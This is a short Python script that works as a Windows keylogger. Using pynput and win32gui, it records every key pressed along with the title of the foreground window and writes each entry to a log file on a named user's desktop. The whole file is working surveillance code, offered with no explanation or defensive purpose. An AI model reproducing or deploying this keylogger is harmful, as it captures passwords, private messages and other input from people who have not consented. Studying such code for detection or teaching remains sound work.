from pynput.keyboard import Key, Listener
from win32gui import GetWindowText, GetForegroundWindow
import logging

log_file = "C:\\Users\\Benjamin Pollak\\Desktop\\log.txt"

logging.basicConfig(filename=(log_file), level=logging.DEBUG, format=( '%(message)s : '))

def on_press(Key):
    log_str = str(Key) + " | " + GetWindowText(GetForegroundWindow())
    print(log_str)
    logging.info(log_str)
    
with Listener(on_press=on_press) as listener:
    listener.join()
